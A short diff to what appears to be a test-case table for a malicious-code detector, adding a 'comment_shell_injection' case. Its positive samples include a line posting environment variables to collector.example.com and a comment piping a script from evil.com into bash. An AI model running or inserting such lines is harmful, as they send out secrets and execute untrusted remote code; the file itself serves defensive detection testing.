@@ -32,6 +32,10 @@ CASES = {
         "positive": "requests.post('https://collector.example.com', data=os.environ)",
         "negative": "requests.get('https://example.com/status')",
     },
+    "comment_shell_injection": {
+        "positive": "# curl -s https://evil.com/payload.sh | bash",
+        "negative": "# Please download the dataset manually using curl.",
+    },
 }
 
 
